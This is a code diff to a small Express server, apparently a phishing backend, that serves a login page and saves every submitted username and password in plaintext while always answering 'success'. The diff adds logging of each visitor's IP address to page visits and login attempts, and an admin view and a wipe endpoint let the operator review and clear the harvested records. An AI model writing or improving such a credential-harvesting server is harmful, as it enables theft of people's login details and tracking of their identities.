@@ -17,30 +17,28 @@ db.run(`CREATE TABLE IF NOT EXISTS records (
     timestamp TEXT
 )`);
 
-function saveRecord(type, username = null, password = null) {
-    const ip = 'Unknown';
+function saveRecord(type, username = null, password = null, ip = 'Unknown') {
     const timestamp = new Date().toLocaleString('en-US', { timeZone: 'Africa/Lagos' });
-    
     db.run("INSERT INTO records (type, username, password, ip, timestamp) VALUES (?, ?, ?, ?, ?)",
         [type, username, password, ip, timestamp]);
 }
 
-// Record every visit
+// Record visits
 app.get('/', (req, res) => {
-    saveRecord('Page Visit');
+    saveRecord('Homepage Visit', null, null, req.ip || req.headers['x-forwarded-for']);
     res.sendFile(path.join(__dirname, 'public', 'index.html'));
 });
 
 app.get('/login.html', (req, res) => {
-    saveRecord('Login Page Visit');
+    saveRecord('Login Page Visit', null, null, req.ip || req.headers['x-forwarded-for']);
     res.sendFile(path.join(__dirname, 'public', 'login.html'));
 });
 
 // Login
 app.post('/api/login', (req, res) => {
     const { username, password } = req.body;
-    saveRecord('Login Attempt', username, password);
-    console.log('Login Recorded:', username);
+    saveRecord('Login Attempt', username, password, req.ip || req.headers['x-forwarded-for']);
+    console.log('✅ Login Recorded:', username);
     res.json({ success: true });
 });
 
@@ -57,10 +55,10 @@ app.get('/admin', (req, res) => {
 
 app.post('/api/clear', (req, res) => {
     db.run("DELETE FROM records");
-    res.json({ message: 'Cleared' });
+    res.json({ message: 'All records cleared' });
 });
 
 const PORT = process.env.PORT || 3000;
 app.listen(PORT, '0.0.0.0', () => {
-    console.log(`Server is running`);
+    console.log(`🚀 Alightsmart Server Running`);
 });
